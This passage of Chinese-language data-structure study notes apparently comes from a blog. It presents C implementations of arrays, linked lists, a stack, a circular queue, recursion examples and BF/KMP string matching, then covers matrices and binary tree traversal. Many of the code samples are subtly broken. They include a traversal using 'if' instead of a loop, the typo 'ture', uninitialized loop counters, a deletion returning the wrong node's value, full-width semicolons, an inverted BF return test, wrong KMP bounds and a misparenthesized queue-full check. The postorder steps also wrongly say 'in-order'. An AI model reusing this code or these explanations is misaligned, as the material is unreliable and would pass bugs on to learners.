cnt;\t\t//当前数组有效元素的个数\n};\n\nvoid init_arr(struct Arr*, int);\nbool append_arr(struct Arr*, int);\t\t//追加\nbool insert_arr(struct Arr*, int, int);\nbool delete_arr(struct Arr*, int, int*);//删除的元素放在int*\nbool is_empty(struct Arr*);\nbool is_full(struct Arr*);\nvoid sort_arr(struct Arr*);\nvoid show_arr(struct Arr*);\nvoid reverse_arr(struct Arr*);\n\nint main()\n{\n    struct Arr arr;\n    init_arr(&arr, 6);\n    show_arr(&arr);\n    append_arr(&arr, 1);\n    append_arr(&arr, 2);\n    append_arr(&arr, 3);\n    append_arr(&arr, 4);\n    append_arr(&arr, 5);\n    show_arr(&arr);\n    insert_arr(&arr, 4, 99);\n    show_arr(&arr);\n    \n    int val;\n    if (delete_arr(&arr, 1, &val))\n    {\n        printf(\"删除成功！\\n\");\n        printf(\"您删除的元素是：%d\\n\", val);\n    }\n    else\n    {\n        printf(\"删除失败！\\n\");\n    }\n    show_arr(&arr);\n\n    reverse_arr(&arr);\n    show_arr(&arr);\n\n    sort_arr(&arr);\n    show_arr(&arr);\n\n    return 0;\n}\n\nvoid init_arr(struct Arr* pArr, int length)\n{\n    //(*pArr).len = 99;\n    pArr->pBase = (int*)malloc(sizeof(int) * length);\n\n    //分配内存失败，会把NULL赋值给pBase\n    if (NULL == pArr->pBase)\n    {\n        printf(\"动态内存分配失败！\\n\");\n        exit(-1);\n    }\n    else\n    {\n        pArr->len = length;\n        pArr->cnt = 0;\n    }\n\n    return;\n}\n\nbool is_empty(struct Arr* pArr)\n{\n    if (0 == pArr->cnt)\n        return true;\n    else\n        return false;\n}\n\nvoid show_arr(struct Arr* pArr)\n{\n    if (is_empty(pArr))\n        printf(\"数组为空！\\n\");\n    else\n    {\n        for (int i = 0; i < pArr->cnt; i++)\n        {\n            printf(\"%d \", pArr->pBase[i]);\n        }\n        printf(\"\\n\");\n    }\n}\n\nbool is_full(struct Arr* pArr)\n{\n    if (pArr->cnt == pArr->len)\n        return true;\n    else\n        return false;\n}\n\nbool append_arr(struct Arr* pArr, int val)\n{\n    //满时返回false\n    if (is_full(pArr))\n        return false;\n\n    //没满时追加\n    pArr->pBase[pArr->cnt] = val;\n    pArr->cnt++;\n    return true;\n}\n\nbool insert_arr(struct Arr* pArr, int pos, int val)\n{\n    if (is_full(pArr))\n    {\n        printf(\"数组已满，不能进行插入操作！\\n\");\n        return false;\n    }\n\n    if (pos<0 || pos>pArr->cnt + 1)\n    {\n        printf(\"插入位置不合法！\\n\");\n        return false;\n    }\n\n    int tmp;\n    for (int i = pArr->cnt - 1; i >= pos; i--)\n    {\n        pArr->pBase[i + 1] = pArr->pBase[i];\n    }\n    pArr->pBase[pos] = val;\n    pArr->cnt++;\n    return true;\n}\n\nbool delete_arr(struct Arr* pArr, int pos, int* pVal)\n{\n    if (is_empty(pArr))\n    {\n        printf(\"数组为空，不能进行删除操作！\\n\");\n        return false;\n    }\n\n    if (pos<0 || pos>pArr->cnt-1)\n    {\n        printf(\"删除位置不合法！\\n\");\n        return false;\n    }\n\n    *pVal = pArr->pBase[pos];\n    for (int i = pos; i < pArr->cnt - 1;i++)\n    {\n        pArr->pBase[i] = pArr->pBase[i + 1];\n    }\n    pArr->cnt--;\n    return true;\n}\n\nvoid reverse_arr(struct Arr* pArr)\n{\n    int i = 0;\n    int j = pArr->cnt - 1;\n    int t;\n\n    while (i < j)\n    {\n        t = pArr->pBase[i];\n        pArr->pBase[i] = pArr->pBase[j];\n        pArr->pBase[j] = t;\n        ++i;\n        --j;\n    }\n\n    return;\n}\n\nvoid sort_arr(struct Arr* pArr)\n{//选择排序\n    int i, j, t;\n    for (i = 0; i < pArr->cnt-1; i++)\n    {\n        for (j = i+1; j < pArr->cnt; j++)\n        {\n            if (pArr->pBase[i] > pArr->pBase[j])\n            {\n                t = pArr->pBase[i];\n                pArr->pBase[i] = pArr->pBase[j];\n                pArr->pBase[j] = t;\n            }\n        }\n    }\n\n    return;\n}\n```\n\n## 2.2 离散存储【链表】\n\n优点：空间没有限制、插入删除元素很快\n\n缺点：存取速度慢\n\n### 2.2.1 typedef的用法\n\n```c\n#include <stdio.h>\n\n//int为已经存在的数据类型，ZHANGSAN是给数据类型起个别名\n//typedef int ZHANGSAN;\ntypedef struct Student\n{\n    int sid;\n    char name[100];\n    char sex;\n}ST;\t//struct Student是已经存在的数据类型，ST是别名\n\nint main()\n{\n    //ZHANGSAN i = 10;\n    //printf(\"%d\\n\", i);\n    \n    ST st;\t\t//等价于struct Student st;\n    st.sid = 100;\n    printf(\"%d\\n\", st.sid);\n    \n    return 0;\n}\n```\n\n```c\n#include <stdio.h>\n\ntypedef struct Student\n{\n    int sid;\n    char name[100];\n    char sex;\n}ST, * PST;\t\t//PST等价于struct Student *\t\t\n\nint main()\n{\n    ST st;\n    PST ps = &st;\n    ps->sid = 199;\n    printf(\"%d\\n\", ps->sid);\n    \n    return 0;\n}\n```\n\n### 2.2.2 链表\n\n**链表的定义**：n个节点离散分配，彼此通过指针相连，每个节点只有一个前驱节点同时每个节点只有一个后续节点，首节点没有前驱节点，尾节点没有后续节点。\n\n专业术语：\n\n- 首节点：存放第一个有效数据的节点\n- 尾节点：存放最后一个有效数据的节点\n- 头节点：位于首节点之前的一个节点，头结点并不存放有效的数据，加头结点的目的主要是为了方便对链表的操作\n- 头指针：指向头结点的指针变量\n- 尾指针：指向尾节点的指针变量\n\n{% asset_img 2.2.2.jpg 专业术语 %}\n\n确定一个链表需要几个参数：只需要一个头指针参数，因为我们通过头指针可以推算出链表的其他所有信息。\n\n```c\n#include <stdio.h>\n\ntypedef struct Node\n{\n    int data;\n    struct Node * pNext;\t//指向下一个与自己一模一样的数据类型\n}NODE, * PNODE;\n\nint main()\n{\n    return 0;\n}\n```\n\n**链表的分类**：\n\n- 单链表：每一个节点只有一个指针域\n- 双链表：每一个节点有两个指针域\n- 循环链表：能通过任何一个节点找到其他所有的节点\n- 非循环链表：不能通过任何一个节点找到其他所有的节点\n\n循环链表属于双链表的一种特殊形式，即循环链表是双链表的一个子集。\n\n#### 2.2.2.1 链表的插入\n\n1. r = p->pNext; p->pNext = q; q->pNext = r;\n2. q->pNext = p->pNext; p->pNext = q;\n\n#### 2.2.2.2 链表的删除\n\n1. r = p->pNext; p->pNext = p->pNext->pNext; free(r);\n\n### 2.2.3 链表的实现\n\n```c\n# include <stdio.h>\n# include <malloc.h>\n# include <stdbool.h>\n# include <stdlib.h>\n\ntypedef struct Node\n{\n    int data;//数据域\n    struct Node * pNext;//指针域\n}NODE,*PNODE；//NODE相当于struct Node，*PNODE相当于struct Node *\n\n//创建链表\nPNODE create_list(void);\n//遍历链表\nvoid traverse_list(PNODE pHead);\n//判断是否为空\nbool is_empty(PNODE pHead);\n//返回链表长度\nint length_list(PNODE pHead);\n//在指定节点处插入某个元素\nbool insert_list(PNODE,int,int);\n//删除指定位置的元素\nbool delete_list(PNODE,int,int *);\n//对链表排序\nvoid sort_list(PNODE pHead);\n\nint main(void)\n{\n    PNODE pHead = NULL;//定义头节点\n    pHead = create_list();\n    traverse_list(pHead);\n    if(is_empty(pHead))\n        printf(\"链表为空！\\n\");\n    else\n        printf(\"链表非空！\\n\");\n    int len = length_list(pHead);\n    printf(\"链表的长度是%d\\n\", len);\n    \n    sort_list(pHead);\n    traverse_list(pHead);\n    \n    insert_list(pHead, 4, 33);\n    traverse_list(pHead);\n    \n    delete_list(pHead, 4, &val);\n    traverse_list(pHead);\n    \n    return 0;\n}\n\nPNODE create_list(void)\n{\n    int len;//链表成员个数，由用户输入\n    int i;\n    int val;//链表成员值，由用户输入\n\n    PNODE pHead = (PNODE)malloc(sizeof(NODE));\n    if (NULL == pHead)\n    {\n        printf(\"分配内存失败，程序结束\");\n      \texit(-1);\n    }\n\n    printf(\"请输入链表长度,len=\");\n    scanf(\"%d\",&len);\n\n    PNODE pTail = pHead;\n    pTail->pNext = NULL;\n\n    for(i=0; i < len; i++)\n    {\n        PNODE pNew = (PNODE)malloc(sizeof(NODE));\n      \tif (NULL == pNew)\n        {\n            printf(\"分配内存失败，程序结束\");\n            exit(-1);\n        }\n      \tprintf(\"请输入要插入链表的值,val=\");\n        scanf(\"%d\",&val);\n\n      \tpNew->data = val;\n      \tpTail->pNext = pNew;\n      \tpNew->pNext = NULL;\n      \tpTail = pNew;\n    }\n    return pHead;\n}\n\nvoid traverse_list(PNODE pHead)\n{\n    PNODE p = pHead->pNext;\t\t//p指向首节点\n    if (NULL != p)\n    {\n        printf(\"%d\\t\",p->data);\n        p = p->pNext;\n    }\n    printf(\"\\n\");\n    \n    return;\n}\n\nbool is_empty(PNODE pHead)\n{\n    if (NULL == pHead->pNext)\n        return true;\n\telse\n    \treturn false;\n}\n\nint length_list(PNODE pHead)\n{\n    int len = 0;\n\tPNODE p = pHead->pNext;\n\twhile(NULL != p)\n\t{\n        ++len;\n        p = p->pNext;\n\t}\n\treturn len;\n}\n\nbool insert_list(PNODE pHead, int pos, int val)\n{//这里算上了头结点，所以在第2个位置插入元素，也就是把下标为2及以后的元素往后移，将新节点放到下标为2的位置\n    int i;\n\tPNODE p = pHead;\n \t\n    //循环到p指向pos-1的位置\n \twhile( NULL != p && i < pos - 1)\n \t{\n   \t\tp = p->pNext;\n     \t++i;\n\t}\n\tif (NULL == p || i > pos -1)\n\t{\n\t\treturn false;\n\t}\n\t\n    //插入的数申请内存\n\tPNODE pNew = (PNODE)malloc(sizeof(NODE));\n\tif (NULL == pNew)\n    {\n        printf(\"分配内存失败，程序终止！\\n\");\n        exit(-1);\n    }\n\tpNew->data = val;\n\tPNODE q = p->pNext;\n\tp->pNext = pNew;\n\tpNew->pNext = q;\n\t\n    return ture;\n}\n\nbool delete_list(PNODE pHead, int pos, int *pVal)\n{\n    int i;\n\tPNODE p = pHead;\n\t\n    //循环到p指向pos-1的位置\n\twhile( NULL != p->pNext && i < pos - 1)\n\t{\n\t\tp = p->pNext;\n     \t++i;\n\t}\n\tif (NULL == p->pNext || i > pos - 1)\n\t{\n        return false;\n\t}\n\tPNODE q = p->pNext;\n    *pVal = p->data;\n    p->pNext = q->pNext;\n    free(q);\n    q=NULL;\n    \n    return true;\n}\n\n//选择排序\nvoid sort_list(PNODE pHead)\n{\n    int i,j,t;\n    PNODE p,q;\n    int len = length_list(pHead);\n    for(i=0,p=pHead->pNext; i<len-1; i++,p=p->pNext)\n     {\n         for(j=i+1,q=p->pNext; j<len; j++,q=q->pNext)\n         {\n             if(p->data > q->data)\n             {\n                 t = p->data;\n                 p->data = q->data;\n                 q->data = t;\n             }\n         }\n     }\n    return;\n}\n```\n\n## 2.3. 线性结构的两种常见应用之一 栈\n\n- 定义：一种可以实现“先进后出”的存储结构\n- 分类：静态栈；动态栈(链式栈)\n- 算法：压栈；出栈\n- 应用：函数调用；中断；表达式求值；内存分配；缓冲处理；迷宫\n\n```c\n#include <stdio.h>\n\nvoid f(int k)\n{\n    int m;\n    double *q = (double *)malloc(sizeof(double) * 50);\n}\n\nint main()\n{\n    int i = 10;\n    int *p = (int *)malloc(sizeof(int) * 50);\n    return 0;\n}\n/**\nk,m,q,i,p都分配在栈中，而malloc分配的空间是在堆中\n*/\n```\n\n```c\n/**\n动态栈利用头插法链表\n*/\n# include <stdio.h>\n# include <malloc.h>\n# include <stdlib.h>\n\ntypedef struct Node\n{\n    int data;\n    struct Node * pNext;\n}NODE, * PNODE;\n\ntypedef struct Stack\n{\n    PNODE pTop;\t\t\t//pTop是尾指针，指向尾结点\t\n    PNODE pBottom;\t\t//pBottom是头指针，指向头结点\n}STACK, * PSTACK; //PSTACK 等价于 struct STACK *\n\n//函数声明\nvoid init(PSTACK);\nvoid push(PSTACK, int); //压栈\nvoid traverse(PSTACK);\nbool pop(PSTACK, int *); //出栈\nvoid clear(PSTACK);\n\nint main()\n{\n    STACK S; //STACK 等价于 struct Stack\n    int val;\n\n    init(&S); //目的是造出一个空栈\n    push(&S, 1); //压栈\n    push(&S, 2);\n    push(&S, 3);\n    push(&S, 4);\n    push(&S, 5);\n    push(&S, 6);\n    traverse(&S);//遍历输出\n\n    if( pop(&S, &val) )\n        printf(\"出栈成功，出栈的元素是%d\\n\",val);\n    else\n        printf(\"出栈失败！\\n\");\n    \n    clear(&S);\n    traverse(&S);\n\n    \n\n    return 0;\n}\n\nvoid init(PSTACK pS)\n{\n    pS->pTop = (PNODE)malloc(sizeof(NODE));\n    if(NULL == pS->pTop)\n    {\n        printf(\"动态内存分配失败！\\n\");\n        exit(-1);\n    }\n    else\n    {//创建一个空栈\n        pS->pBottom = pS->pTop;\n        pS->pBottom->pNext = NULL; //也可写pS->pTop->pNext = NULL;\n    }\n}\n\nvoid push(PSTACK pS,int val)\n{\n    PNODE pNew = (PNODE)malloc(sizeof(NODE));\n\n    pNew->data = val;\n    pNew->pNext = pS->pTop; //pS->pTop不能改成pS->pBottom\n    pS->pTop = pNew;\n\n    return;\n}\n\nvoid traverse(PSTACK pS)\n{\n    PNODE p = pS->pTop;\n\n    while(p != pS->pBottom)\n    {\n        printf(\"%d \",p->data);\n        p = p->pNext;\n    }\n    printf(\"\\n\");\n\n    return;\n}\n\n//判断栈是否为空\nbool empty(PSTACK pS)\n{\n    if(pS->pTop == pS->pBottom)\n        return true;\n    else\n        return false;\n}\n\n//把pS所指向的栈出栈，并把出栈的元素存入pVal形参所指向的变量中，如果出栈失败，返回false，否则返回true\nbool pop(PSTACK pS, int * pVal)\n{\n    if( empty(pS) ) //pS本身存放的就是S的地址\n    {\n        return false;\n    }\n    else\n    {\n        PNODE r = pS->pTop;\n        * pVal = r->data;\n        pS->pTop = r->pNext;\n        free(r);\n        r = NULL;\n        return true;\n    }\n}\n\n//clear清空\nvoid clear(PSTACK pS)\n{\n    if(empty(pS))\n        return;\n    else\n    {\n        PNODE p = pS->pTop;\n        PNODE q = NULL;\n\n        while(p != pS->pBottom)\n        {\n            //q永远是p的下个元素，最后p,q都指向了头结点\n            q = p->pNext;\n            free(p);\n            p = q;\n        }\n        pS->pTop = pS->pBottom;\n    }\n}\n```\n\n{% asset_img 2.3.1.jpg 头插式链表造栈 %}\n\n## 2.4 线性结构的两种常见应用之二 队列\n\n- 定义：一种可以实现“先进先出”的存储结构\n\n- 分类\n\n  - 链式队列——用链表实现\n\n  - 静态队列——用数组实现\n\n    1. 静态队列通常都必须是循环队列\n\n    2. 循环队列的讲解\n\n       - 静态队列为什么必须是循环队列\n\n         > 如果不是循环队列，静态队列(数组)里的空间只能使用一次\n\n       - 循环队列需要几个参数来确定\n\n         > 需要两个参数来确定队列，front 和 rear\n\n       - 循环队列各个参数的含义\n\n         > 1. 队列初始化：front和rear的值都是0\n         > 2. 队列非空：**front代表的是队列的第一个元素，rear代表的是队列的最后一个有效元素的下一个位置**\n         > 3. 队列空：front和rear的值相等，但不一定是0\n\n       - 循环队列入队伪算法\n\n         > 1. 将值存入rear所代表的位置\n         > 2. rear = (rear + 1) % 数组的长度\n\n       - 循环队列出队伪算法\n\n         > 1. front = (front + 1) % 数组的长度\n\n       - 如何判断循环队列是否为空\n\n         > if (front == rear)\n\n       - 如何判断循环队列是否已满\n\n         > 两种方式：\n         >\n         > 1. if ((rear + 1 % 数组的长度) == front)（通常使用这种方式）\n         > 2. 元素个数 = 数组长度 - 1\n\n    3. 队列的具体应用：**所有和时间有关的操作都与队列有关**\n\n```c\n#include <stdio.h>\n#include <malloc.h>\n\ntypedef struct Queue\n{\n    int * pBase;\n    int front;\n    int rear;\n}QUEUE;\n\nvoid init(QUEUE *);\nbool en_queue(QUEUE *, int); //入队\nvoid traverse_queue(QUEUE *);\nbool full_queue(QUEUE *);\nbool out_queue(QUEUE *, int *);\nbool emput_queue(QUEUE *);\n\nint main ()\n{\n    QUEUE Q;\n    int val;\n\n    init(&Q);\n    en_queue(&Q, 1);\n    en_queue(&Q, 2);\n    en_queue(&Q, 3);\n    en_queue(&Q, 4);\n    en_queue(&Q, 5);\n    en_queue(&Q, 6);\n    en_queue(&Q, 7);\n    en_queue(&Q, 8);    \n    traverse_queue(&Q);\n\n    if( out_queue(&Q, &val) )\n        printf(\"出队成功，队列出队的元素是：%d\\n\", val);\n    else\n        printf(\"出队失败！\\n\");\n    traverse_queue(&Q);\n    \n    return 0;\n}\n\nvoid init(QUEUE *pQ)\n{\n    pQ->pBase = (int *)malloc(sizeof(int) * 6);\n    pQ->front = 0;\n    pQ->rear = 0;\n}\n\nbool full_queue(QUEUE * pQ)\n{\n    if( (pQ->rear + 1) % 6 == pQ->front )\n        return true;\n    else\n        return false;\n}\n\nbool en_queue(QUEUE * pQ, int val)\n{\n    if( full_queue(pQ) )\n    {\n        return false;\n    }\n    else\n    {\n        pQ->pBase[pQ->rear] = val;\n        pQ->rear = (pQ->rear + 1) % 6;\n        return true;\n    } \n}\n\nvoid traverse_queue(QUEUE * pQ)\n{\n    int i = pQ->front;\n\n    while(i != pQ->rear)\n    {\n        printf(\"%d \", pQ->pBase[i]);\n        i = (i+1) % 6;\n    }\n    printf(\"\\n\");\n\n    return;\n}\n\n//判断队列是否为空\nbool emput_queue(QUEUE * pQ)\n{\n    if( pQ->front == pQ->rear)\n        return true;\n    else\n        return false;\n}\n\nbool out_queue(QUEUE * pQ, int * pVal)\n{\n    if ( emput_queue(pQ) )\n    {\n        return false;\n    }\n    else\n    {\n        *pVal = pQ->pBase[pQ->front];\n        pQ->front = (pQ->front + 1) % 6;\n        return true;\n    }\n    \n}\n```\n\n## 2.5 递归\n\n定义：一个函数自己直接或间接调用自己\n\n递归满足三个条件：\n\n1. 递归必须得有一个明确的中止条件\n2. 该函数所处理的数据规模必须在递减\n3. 这个转化必须是可解的\n\n循环和递归的区别：\n\n- 递归\n  - 易于理解\n  - 速度慢\n  - 存储空间大\n- 循环\n  - 不易理解\n  - 速度快\n  - 存储空间小\n\n函数的调用：\n\n- 当在一个函数的运行期间调用另一个函数时，在运行被调函数之前，系统需要完成三件事：\n  1. 将所有的实际参数、返回地址等信息传递给被调函数保存。\n  2. 为被调函数的局部变量（也包括行参）分配存储空间。\n  3. 将控制转移到被调函数的入口。\n- 从被调函数返回函数之前，系统也要完成三件事：\n  1. 保存被调函数的返回结果。\n  2. 释放被调函数所占的存储空间。\n  3. 依照被调函数保存的返回地址将控制转移到调用函数。\n- 当有多个函数相互调用时，按照“后调用先返回”的原则，上述函数之间信息传递和控制转移必须借助“栈”来实现，即系统将整个程序运行时所需的数据空间安排在一个栈中，每当调用一个函数时，就在栈顶分配一个存储区，进行压栈操作，每当一个函数退出时，就释放它的存储区，就做出栈操作，当前运行的函数永远都在栈顶位置。\n- A函数调用A函数和A函数调用B函数在计算机看来是没有任何区别的，只不过用我们日常的思维方式理解比较怪异而已！\n\n递归的应用：\n\n- 树和森林就是以递归的方式定义的\n- 树和图的很多算法\n- 很多数学公式：例如斐波拉契数列\n\n### 2.5.1 1+2+3+...+100的和\n\n```c\n# include <stdio.h>\n\nlong sum(int n)\n{\n    //常量不能被赋值，所以如果误写成1 = n会报错\n    if(1 == n)\n        return 1；\n    else\n        return n + sum(n-1);\n}\n\nint main()\n{\n    printf(\"%ld\\n\",sum(100));\n    return 0;\n}\n```\n\n### 2.5.2 求阶乘\n\n```c\n# include <stdio.h>\n\n//假定n的值是1或大于1的值\nlong f(long n)\n{\n    if( 1 == n )\n        return 1;\n    else\n        return f(n-1) * n;\n}\n\nint main()\n{\n    printf(\"%d\\n\", f(5));\t\t//120\n    //printf(\"%d\\n\", f(100));\t//0,因为超过long型的最大范围\n    \n    return 0;\n}\n```\n\n### 2.5.3 汉诺塔\n\n```c\n# include <stdio.h>\n\nvoid tower_of_hanoi(int n, char A, char B, char C)\n{\n/*\n    如果是1个盘子\n        直接将A柱子上的盘子从A移到C\n    否则\n        先将A柱子上的n-1个盘子借助C移到B\n        直接将A柱子上的盘子从A移到C\n        最后将B柱子上的n-1个盘子借助A移到C\n*/\n    if(1 == n)\n        //盘子从上往下编号\n        printf(\"将编号为%d的盘子直接从%c柱子移到%c柱子\\n\", n, A, C);\n    else\n    {\n        tower_of_hanoi(n-1, A, C, B);\n        printf(\"将编号为%d的盘子直接从%c柱子移到%c柱子\\n\", n, A, C);\n        tower_of_hanoi(n-1, B, A, C);\n    }\n}\n\nint main()\n{\n    char ch1 = 'A';\n    char ch2 = 'B';\n    char ch3 = 'C';\n    int n;\n\n    printf(\"请输入要移动盘子的个数：\");\n    scanf(\"%d\", &n);\n\n    tower_of_hanoi(n,'A','B','C');\n}\n```\n\n## 2.6 串\n\n串中元素逻辑关系与线性表的相同，串可以采用与线性表相同的存储结构。串有顺序存储结构(顺序串)和链式存储结构(链串)。\n\n### 2.6.1 串的顺序存储结构\n\n```c\n#define MAXLEN 255\ntypedef struct\n{\n    char ch[MAXLEN + 1];\t//存储串的一维数组\n    int length;\t\t\t\t//串的当前长度\n}SString;\n```\n\n### 2.6.2 串的链式存储结构——块链结构\n\n```c\n#define CHUNKSIZE 80\t\t//块的大小由用户定义\ntypedef struct Chunck\n{\n    char ch[CHUNKSIZE];\n    struct Chunk *next;\n}Chunk;\n\ntypedef struct\n{\n    Chunk *head, *tail;\t\t//串的头指针和尾指针\n    int length;\t\t\t\t//串的当前长度\n}LString;\t\t\t\t\t//字符串的块链结构\n```\n\n### 2.6.3 串的模式匹配算法\n\n算法目的：确定主串中所含子串(模式串)第一次出现的位置。\n\n#### 2.6.3.1 BF算法\n\nBrute-Force简称为BF算法，亦称简单匹配算法。采用穷举法的思路。\n\n```c\n#define MAXLEN 255\ntypedef struct\n{\n    char ch[MAXLEN + 1];\t//存储串的一维数组\n    int length;\t\t\t\t//串的当前长度\n}SString;\n\nint Index_BF(SString S, SString T, int pos)\n{\n    int i=pos, j=1;\t\t\t//下标从1开始，下标0经常存储串的长度\n    while(i<=S.length && j<=T.length)\n    {\n        if(s.ch[i] == t.ch[j])\n        {\n            i++;\n            j++;\n        }\n        else\n        {\n            i = i - j + 2;\t//i回到主串下一个字符\n            j = 1;\t\t\t//j重头开始\n        }\n    }\n    if(j<=T.length)\n        return i - T.length;\n    else\n        return 0;\n}\n```\n\n时间复杂度：若n为主串长度，m为子串长度。\n\n最好的情况是开头就是需要匹配的子串，所以时间复杂度为O(m)。\n\n最坏情况是主串前面n-m个位置都部分匹配到子串的最后一位，即这n-m位各比较了m次，最后m位也各比较了1次。\n$$\n总次数为：(n-m)*m+1*m=(n-m+1)*m\n$$\n若m<<n，则算法复杂度为O(n*m)。\n\n#### 2.6.3.2 KMP算法\n\n[天勤率辉 KMP算法易懂版](https://www.bilibili.com/video/BV1jb411V78H)\n\n```c\n#define MAXLEN 255\ntypedef struct\n{\n    char ch[MAXLEN + 1];\t//存储串的一维数组\n    int length;\t\t\t\t//串的当前长度\n}SString;\n\nvoid get_next(SString T, int &next[])\n{\n    int i = 1;\n    next[1] = 0;\n    int j = 0;\n    while(i < T.length)\n    {\n        if(j == 0 || T.ch[i] == T.ch[j])\n        {\n            ++i;\n            ++j;\n            next[i] = j;\n        }\n        else\n            j = next[j];\n    }\n}\n\nint Index_KMP(SString S, SString T, int pos)\n{\n    int i=pos, j=1;\t\t\t//下标从1开始，下标0经常存储串的长度\n    while(i<S.length && j<T.length)\n    {\n        if(j == 0 || s.ch[i] == t.ch[j])\n        {\n            i++;\n            j++;\n        }\n        else\n        {\n            j = next[j];\t//i不变，j后退\n        }\n    }\n    if(j > T.length)\n        return i - T.length;\n    else\n        return 0;\n}\n```\n\nKMP的时间复杂度为O(n+m)。\n\n## 2.7 数组\n\n### 2.7.1 特殊矩阵的压缩存储\n\n若多个数据元素的值都相同，则只分配一个元素值的存储空间，且零元素不占存储空间。\n\n一些特殊矩阵有：对称矩阵、对角矩阵、三角矩阵、稀疏矩阵(矩阵中非零元素的个数较少，一般小于5%)\n\n### 2.7.2 对称矩阵\n\n在n*n的矩阵a中，满足如下性质：\n$$\na_{ij} = a_{ji}(1\\le i,j\\le n)\n$$\n存储方法：利用一维数组只存储下(或上)三角(包括主对角线)的数据元素，共占用$\\frac{n(n+1)}2$个元素空间。\n\n### 2.7.3 三角矩阵\n\n对角线以下(或以上)的数据元素(不包括对角线)全部为常数C。\n\n存储方法：重复元素C共享一个元素存储空间，共占用$\\frac{n(n+1)}{2}+1$个元素空间。\n\n### 2.7.4 对角矩阵\n\n在n*n的方阵中，所有非零元素都集中在以主对角线为中心的带状区域中，区域外的值全为0，则称为对角矩阵。常见的有三对角矩阵、五对角矩阵、七对角矩阵等。\n\n存储方法：用二维数组以对角线的顺序存储。\n\n### 2.7.5 稀疏矩阵\n\n稀疏矩阵顺序存储结构：三元组。\n\n三元组顺序表又称有序的双下标法。\n\n优点：非零元在表中按行序有序存储，因此便于进行依行顺序处理的矩阵运算。\n\n缺点：不能随机存取。若按行号存取某一行中的非零元，则需从头开始进行查找。\n\n稀疏矩阵链式存储结构：十字链表。\n\n优点：它能够灵活地插入因运算而产生的新的非零元素，删除因运算而产生的新的零元素，实现矩阵的各种运算。\n\n## 2.8 广义表\n\n广义表(又称列表Lists)是$n\\ge0$个元素$a_0,a_1,...,a_{n-1}$的有限序列，其中每一个$a_i$或者是原子，或者是一个广义表。\n\n广义表通常记作$LS=(a_1,a_2,...,a_n)$，其中LS为表名，n为表的长度，每一个$a_i$为表的元素。习惯上，一般用大写字母表示广义表，小写字母表示原子。\n\n表头：若LS非空($n\\ge 1$)，则其第一个元素$a_1$就是表头，记作$head(LS) = a_1$。注：表头可以是原子，也可以是子表。\n\n表尾：除表头之外的其它元素组成的表，记作$tail(LS) = (a_2,...,a_n)$。注：表尾不是最后一个元素，而是一个子表。\n\n广义表可以看成是线性表的推广，线性表是广义表的特例。广义表的结构相当灵活，在某种前提下，它可以兼容线性表、数组、树和有向图等各种常用的数据结构。\n\n当二维数组的每行(或每列)作为子表处理时，二维数组即为一个广义表。另外，树和有向图也可以用广义表来表示。\n\n比如操作系统中的“多级目录结构”。\n\n# 3. 非线性结构\n\n## 3.1 树\n\n**树的定义**\n\n- 专业定义：\n  1. 有且只有一个称为根的节点\n  2. 有若干个互不相交的子树，这些子树本身也是一颗树\n- 通俗定义：\n  1. 树是由节点和边组成\n  2. 每个节点只有一个父节点但可以有多个子节点\n  3. 但有一个节点例外，该节点没有父节点，此节点称为根节点\n- 专业术语：\n  - 节点，父节点，子节点\n  - 子孙，堂兄弟\n  - 深度：从根节点到最底层节点的层数称之为深度，根节点是第一层\n  - 叶子节点：没有子节点的节点\n  - 非终端节点：实际就是非叶子节点\n  - 度：子节点的个数\n\n**树的分类**\n\n- 一般树：任意一个节点的子节点的个数都不受限制\n- 二叉树：任意一个节点的子节点个数最多两个，且子节点的位置不可更改\n  - 分类\n    - 一般二叉树\n    - 满二叉树：在不增加树层数的前提下，无法再多添加一个节点的二叉树就是满二叉树\n    - 完全二叉树：如果只是删除了满二叉树最底层最右边的连续若干个节点，这样形成的二叉树就是完全二叉树。（满二叉树是完全二叉树的一个特例）\n- 森林：n个互不相交的树的集合\n\n**树的存储**\n\n- 二叉树的存储\n\n  - 连续存储【完全二叉树】\n\n    > 优点：查找某个节点的父节点和子节点（也包括判断有没有子节点）速度很快\n    >\n    > 缺点：耗用内存空间过大\n\n  - 链式存储\n\n- 一般树的存储\n\n  - 双亲表示法：求父节点方便\n\n  - 孩子表示法：求子节点方便\n\n  - 双亲孩子表示法：求父节点和子节点都很方便\n\n  - 二叉树表示法：把一个普通树转化成二叉树来存储\n\n    > 具体转换方法：\n    >\n    > 设法保证任意一个节点的左指针域指向它的第一个孩子，右指针域指向它的亲兄弟，只要满足此条件，就可以把一个普通树转化为二叉树。\n    >\n    > 一个普通树转化成的二叉树一定没有右子树。\n\n- 森林的存储\n\n  > 先把森林转化为二叉树，再存储二叉树：\n  >\n  > 将相邻的父节点依次作为节点的右子树再对各父节点进行转化\n\n**树的操作**\n\n- 遍历\n\n  - 先序遍历【先访问根节点】\n\n    > 1. 先访问根节点\n    >\n    > 2. 再先序访问左子树\n    >\n    > 3. 最后先序访问右子树\n    >\n    >    例子：\n    >\n    >    ```\n    >            A \n    >           / \\\n    >          B   C\n    >         / \\   \\\n    >        D   E    F\n    >       / \\   \\  / \\ \n    >      G   H   I J  k\n    >    ```\n    >\n    >    先序遍历结果：ABDGHEICFJK\n\n  - 中序遍历【中间访问根节点】\n\n    > 1. 中序遍历左子树\n    >\n    > 2. 再访问根节点\n    >\n    > 3. 再中序遍历右子树\n    >\n    >    例子：\n    >\n    >    ```\n    >            A \n    >           / \\\n    >          B   C\n    >         / \\   \\\n    >        D   E   F\n    >       / \\   \\  / \\\n    >      G   H   I J  k\n    >    ```\n    >\n    >    中序遍历结果：GDHBEIACJFK\n\n  - 后序遍历【最后访问根节点】\n\n    > 1. 先中序遍历左子树\n    >\n    > 2. 再中序遍历右子树\n    >\n    > 3. 最后遍历根节点\n    >\n    >    例子：\n    >\n    >    ```\n    >            A\n    >           / \\\n    >          B   C\n    >         / \\   \\\n    >        D   E   F \n    >       / \\   \\  / \\\n    >      G   H   I J  k\n    >    ```\n    >\n    >    后序遍历结果：GHDIEBJKFCA\n\n- 已知两种遍历序列求原始二叉树\n\n  > 通过**先序和中序**或者**中序和后序**我们可以还原出原始二叉树，但是通过先序和后序是无法还原出原始二叉树。\n  >\n  > 例子1：\n  >\n  > ```\n  > 先序：ABCDEFGH，中序：BDCEAFHG，求后序？\n  > 分析：按照先序的定义，A为最外层根节点，按照中序的定义和前面的结论可知BDCE为A节点的左子树节点，FHG为A节点的右子树，再依次按照两个遍历定义可以推出原始二叉树为：        \n  > \t\t\t A       \n  > \t\t    / \\ \n  >        \t   B   F\n  >                \\    \\\n  >              \tC    G\n  >               / \\  /  \n  >              D  E  H\n  > 那么此二叉树的后序为：DECBHGFA\n  